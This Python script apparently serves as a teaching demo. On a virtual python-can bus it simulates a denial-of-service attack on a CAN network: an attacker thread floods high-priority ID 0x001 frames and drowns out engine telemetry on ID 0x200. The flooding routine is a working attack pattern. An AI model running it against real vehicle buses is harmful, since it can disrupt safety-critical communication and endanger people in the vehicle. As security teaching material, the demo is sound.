"""
can_fd_attack_flood_dos.py

Demonstrates a high-priority flooding / DoS attack on a CAN-style bus.

- EngineECU sends legitimate engine telemetry on ID 0x200.
- AttackerNode floods the bus with higher-priority ID 0x001.
- Insecure receiver shows that attack frames dominate traffic,
  degrading availability of legitimate messages.
"""

import can
import threading
import time
import struct
import sys

CHANNEL = "demo"
rx_ready = threading.Event()

# Legitimate critical traffic ID (normal priority)
LEGIT_ID = 0x200
# Attacker uses a lower numeric ID -> higher CAN priority
FLOOD_ID = 0x001


def make_bus():
    """Helper to create a virtual CAN bus."""
    try:
        return can.interface.Bus(interface="virtual", channel=CHANNEL)
    except TypeError:
        return can.interface.Bus(bustype="virtual", channel=CHANNEL)


def pack_engine_data(rpm, coolant_temp, fuel_level):
    """
    Basic 4-byte payload for engine-like data.
    No authentication, no defense: this file is the 'insecure world'.
    """
    return struct.pack("<HBB", rpm, coolant_temp, fuel_level)


def receiver_insecure():
    """
    Insecure receiver that just logs everything it sees.
    Shows how the attack frames dominate the traffic stats.
    """
    bus = make_bus()
    print(f"[RX] listening... (python {sys.version.split()[0]}, python-can {can.__version__})",
          flush=True)
    rx_ready.set()

    count_legit = 0
    count_attack = 0

    t_end = time.time() + 5  # listen for 5 seconds
    try:
        while time.time() < t_end:
            msg = bus.recv(timeout=1.0)
            if not msg:
                continue

            msg_id = msg.arbitration_id
            data = bytes(msg.data)

            if msg_id == LEGIT_ID:
                count_legit += 1
                if len(data) >= 4:
                    rpm, temp, fuel = struct.unpack("<HBB", data[:4])
                    print(f"[RX] LEGIT   ID=0x{msg_id:X} RPM={rpm} Temp={temp}C Fuel={fuel}%",
                          flush=True)
                else:
                    print(f"[RX] LEGIT   ID=0x{msg_id:X} DATA={data.hex(' ').upper()}",
                          flush=True)
            elif msg_id == FLOOD_ID:
                count_attack += 1
                print(f"[RX] ATTACK  ID=0x{msg_id:X} DATA={data.hex(' ').upper()}",
                      flush=True)
            else:
                print(f"[RX] OTHER   ID=0x{msg_id:X} DATA={data.hex(' ').upper()}",
                      flush=True)
    finally:
        bus.shutdown()
        print(f"[RX] shutdown cleanly (saw {count_legit} legit vs {count_attack} attack frames)",
              flush=True)


def sender_legit():
    """
    Legitimate ECU sending critical messages at a moderate rate on LEGIT_ID.
    """
    bus = make_bus()
    rx_ready.wait(timeout=2)

    start = time.time()
    while time.time() - start < 3.0:  # send for ~3 seconds
        payload = pack_engine_data(rpm=2500, coolant_temp=90, fuel_level=70)
        msg = can.Message(
            arbitration_id=LEGIT_ID,
            is_extended_id=False,
            data=payload,
            is_fd=False,  # classical CAN-style frame
        )
        bus.send(msg)
        print(f"[LEGIT] sent ID=0x{LEGIT_ID:X} DATA={payload.hex(' ').upper()}",
              flush=True)
        time.sleep(0.3)  # ~3–4 messages per second

    bus.shutdown()


def sender_attacker_flood():
    """
    Attacker floods the bus with high-priority frames on FLOOD_ID.
    This is a DoS attack on availability: lower ID wins CAN arbitration more often.
    """
    bus = make_bus()
    rx_ready.wait(timeout=2)

    payload = b"\xDE\xAD\xBE\xEF"  # arbitrary 'junk' data

    start = time.time()
    while time.time() - start < 3.0:
        msg = can.Message(
            arbitration_id=FLOOD_ID,  # higher priority than LEGIT_ID
            is_extended_id=False,
            data=payload,
            is_fd=False,
        )
        bus.send(msg)
        print(f"[ATTACK] flood ID=0x{FLOOD_ID:X} DATA={payload.hex(' ').upper()}",
              flush=True)
        time.sleep(0.02)  # very high rate (~50 msgs/sec)
    bus.shutdown()


def main():
    """
    Run insecure receiver + one legitimate sender and one flooding attacker.
    This file represents the ATTACK scenario (no defense).
    """
    rx_thread = threading.Thread(target=receiver_insecure, daemon=True)
    rx_thread.start()

    legit_thread = threading.Thread(target=sender_legit, daemon=True)
    attacker_thread = threading.Thread(target=sender_attacker_flood, daemon=True)

    legit_thread.start()
    attacker_thread.start()

    legit_thread.join()
    attacker_thread.join()
    rx_thread.join()

    print("[SYS] Flood/DoS attack demo complete", flush=True)


if __name__ == "__main__":
    main()
